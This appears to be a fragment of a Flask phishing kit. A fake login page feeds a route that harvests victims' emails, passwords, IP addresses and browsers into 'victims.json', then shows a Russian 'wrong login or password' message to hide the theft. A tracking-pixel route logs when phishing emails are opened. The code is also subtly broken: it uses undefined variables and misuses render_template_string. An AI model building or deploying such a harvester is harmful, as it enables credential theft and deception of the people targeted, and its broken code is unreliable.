

@app.route('/fake_login', methods=['GET'])
def login():
	return render_template_string('fake_login.html')

@app.route('/capture_login', methods=['POST'])
def capture_login():
	username=request.form['email']
	password=request.form['password']
	victim_data = {
		'email':email,
		'password':password,
		'ip': request.remote_addr,
		'user_agent':request.headers.get('User-Agent')
	}
	with open('victims.json', 'a') as file:
		file.write(json.dumps(data)+'\n')
	print(f"Creds from {ip}: {email} : {password}")
	return "Неверный логин или пароль."

@app.route('/trackingpixel.png', methods=['POST'])
def track_pixel():
	tracking_data = {
		'event': 'email_opened', 
		'ip': request.remote_addr,
		'user_agent': request.headers.get('User-Agent')
	}
	with open('tracking_data.json', 'a') as file: 
		file.write(json.dumps(data) + '\n')
	print(f"Email opened by {request.remote_addr}")
	return "",204